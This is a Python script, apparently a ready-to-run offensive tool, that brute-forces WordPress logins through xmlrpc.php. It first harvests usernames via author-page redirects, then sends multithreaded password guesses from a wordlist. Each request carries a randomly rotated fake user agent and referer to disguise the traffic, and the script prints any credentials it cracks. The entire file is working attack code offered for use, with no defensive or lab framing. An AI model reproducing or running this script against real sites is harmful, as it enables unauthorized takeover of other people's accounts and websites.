import requests
import threading
import random
from queue import Queue
import xml.etree.ElementTree as ET

print("\033[1;36m")
print(r"""
__  ____  __ _          ____  ____   ____
\ \/ /  \/  | |        |  _ \|  _ \ / ___|
 \  /| |\/| | |   _____| |_) | |_) | |
 /  \| |  | | |__|_____|  _ <|  __/| |___
/_/\_\_|  |_|_____|    |_| \_\_|    \____|

XML-RPC Brute Forcer - By Sheikh Nightshader
""")
print("\033[0m")

target_url = input("WordPress URL: ").rstrip("/")
if not target_url.endswith("/xmlrpc.php"):
    xmlrpc_url = f"{target_url}/xmlrpc.php"
else:
    xmlrpc_url = target_url

wordlist = input("Path to password wordlist: ")
threads_count = int(input("Number of threads: "))                                       
password_queue = Queue()

fake_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:62.0) Gecko/20100101 Firefox/62.0",
    "Mozilla/5.0 (Linux; Android 9; SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/90.0.818.49",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; Redmi 6 Pro Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
    "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Nexus 5 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (X11; Linux i686; rv:64.0) Gecko/20100101 Firefox/64.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Version/13.0.4 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Android 7.1.1; SM-T580) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
]

fake_referers = [
    "https://google.com",
    "https://bing.com",
    "https://yahoo.com",
    "https://duckduckgo.com",
    "https://baidu.com",
    "https://yandex.com",
]

def find_usernames(url):
    usernames = set()
    for i in range(1, 11):
        try:
            author_url = f"{url}/?author={i}"
            response = requests.get(author_url, timeout=5, allow_redirects=True)
            if response.status_code == 200 and response.url != author_url:  
                username = response.url.rstrip("/").split("/")[-1]  # Fixed indentation here
                usernames.add(username)
        except Exception:
            continue
    return list(usernames)

def load_passwords():
    with open(wordlist, "r") as f:
        for line in f:
            password_queue.put(line.strip())

def parse_response(response_text):
    try:
        root = ET.fromstring(response_text)
        blog = root.find(".//struct/member[name='blogid']/value")
        return blog is not None
    except ET.ParseError:
        return False

def brute_force(username):
    while not password_queue.empty():
        password = password_queue.get()
        payload = f"""
        <?xml version="1.0" encoding="UTF-8"?>
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value><string>{username}</string></value></param>
                <param><value><string>{password}</string></value></param>
            </params>
        </methodCall>
        """
        headers = {
            'Content-Type': 'application/xml',
            'User-Agent': random.choice(fake_user_agents),
            'Referer': random.choice(fake_referers),
        }
        try:
            response = requests.post(xmlrpc_url, data=payload, headers=headers, timeout=5)
            if response.status_code == 200 and parse_response(response.text):
                print(f"\033[1;32m[+] Success: {username}:{password}\033[0m")
                password_queue.queue.clear()
                break
            else:
                print(f"\033[1;31m[-] Failed: {username}:{password}\033[0m")
        except Exception as e:
            print(f"\033[1;31m[!] Error: {e}\033[0m")
        password_queue.task_done()

usernames = find_usernames(target_url)
if usernames:
    print("\033[1;34mDiscovered usernames:\033[0m")
    for idx, username in enumerate(usernames, start=1):
        print(f"{idx}. {username}")
    choice = int(input("Select a username: "))
    selected_username = usernames[choice - 1]
else:
    selected_username = input("Enter the username manually: ")

load_passwords()
threads = []
for _ in range(threads_count):
    t = threading.Thread(target=brute_force, args=(selected_username,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
